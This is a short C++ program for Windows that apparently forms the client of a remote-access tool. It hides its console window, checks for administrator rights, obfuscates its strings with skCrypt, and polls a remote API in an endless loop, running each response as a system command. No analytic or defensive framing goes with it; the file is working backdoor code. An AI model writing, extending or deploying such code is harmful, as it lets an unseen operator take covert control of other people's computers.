#include <windows.h>
#include <iostream>
#include <string>
#include "Functions.h"
using namespace std;

int main(int argc, char* argv[])
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    string admin = cmd(skCrypt("powershell \"([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')\""));
    if (strstr(admin.c_str(), "False")) notAdmin();
    char basePath[255] = "";
    _fullpath(basePath, argv[0], sizeof(basePath));
    string response = apiCall(skCrypt("check"));
    if (response == "Blacklisted") blacklisted();
    if (response == "Not Linked") {
        notLinked(basePath);
    }

    while (true) {
        response = apiCall(skCrypt(""));
        if (response == "wait") Sleep(5000);
        if (response == "Blacklisted") blacklisted();
        if (response != "wait" && response != "Blacklisted") cmd(to_char(response));
    }
}